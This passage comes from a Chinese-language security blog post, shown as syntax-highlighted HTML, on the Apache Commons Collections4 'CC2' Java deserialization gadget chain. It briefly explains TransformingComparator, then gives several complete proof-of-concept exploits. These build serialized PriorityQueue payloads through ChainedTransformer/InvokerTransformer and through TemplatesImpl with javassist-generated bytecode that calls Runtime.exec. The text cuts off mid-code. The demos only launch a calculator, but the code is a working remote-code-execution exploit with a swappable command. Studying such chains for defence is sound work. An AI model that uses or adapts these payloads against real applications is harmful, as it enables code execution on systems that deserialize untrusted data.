<span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">=</span> decorated<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">=</span> transformer<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>        O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> total <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> total <span class="token operator">=</span> total <span class="token operator">*</span> <span class="token number">37</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        total <span class="token operator">=</span> total <span class="token operator">*</span> <span class="token number">37</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> total<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>null <span class="token operator">==</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            TransformingComparator<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> comp <span class="token operator">=</span> <span class="token punctuation">(</span>TransformingComparator<span class="token punctuation">)</span>object<span class="token punctuation">;</span>            <span class="token keyword">return</span> null <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">?</span> null <span class="token operator">==</span> comp<span class="token punctuation">.</span>decorated <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>decorated<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> null <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">?</span> null <span class="token operator">==</span> comp<span class="token punctuation">.</span>transformer <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>transformer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看一下他的定义，在compare函数里会执行transform方法，那么就可以执行恶意代码了。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>    O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>类似commons colletions1，直接让Transformer为ChainedTransformer就ok。<br>找到的这种方法的payload。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue<span class="token operator">&lt;</span>String<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">name</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220829/calc1.png"></p><h4 id="templatesImpl"><a href="#templatesImpl" class="headerlink" title="templatesImpl"></a>templatesImpl</h4><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()会实例化一个自定义的类。其中，这一个类是TemplatesImpl的一个属性（字节码形式）<br>我们不是可以执行任意方法了吗，构造一个恶意类的字节码让他实例化就行了。<br>SE写的博客中就是这种方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String AbstractTranslet<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">;</span>        String TemplatesImpl<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>        ClassPool classPool<span class="token operator">=</span>ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classPool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass payload<span class="token operator">=</span>classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"CC2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        payload<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         payload<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转换为byte数组</span>        Object templatesImpl<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>TemplatesImpl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field1<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer transformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator comparator <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field2<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field3<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field3<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field3<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">,</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream inputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        inputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220829/calc2.png"></p><h4 id="完整poc分析"><a href="#完整poc分析" class="headerlink" title="完整poc分析"></a>完整poc分析</h4><p>直接贴了桥的，桥将两种方法的调用都写了，并且将具体分析写入了注释当中，可以跟着学习一下。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> learn<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections2</span> <span class="token keyword">extends</span> <span class="token class-name">tools<span class="token punctuation">.</span>SerAndDe</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*    Gadget chain:        ObjectInputStream.readObject()            PriorityQueue.readObject()                ...                    TransformingComparator.compare()                        InvokerTransformer.transform()                            Method.invoke()                                Runtime.exec() */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        poc1();</span>        <span class="token function">poc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">poc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator comparator<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue queue<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//debug发现size>=2才行</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//comparator直接构造器设置的话，add的时候会类型错误。所以反射设置</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field comparatorField<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">poc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//制作父类为AbstractTranslet的RCE类的字节码bytes</span>        ClassPool classPool<span class="token operator">=</span>ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回默认的类池</span>        classPool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" 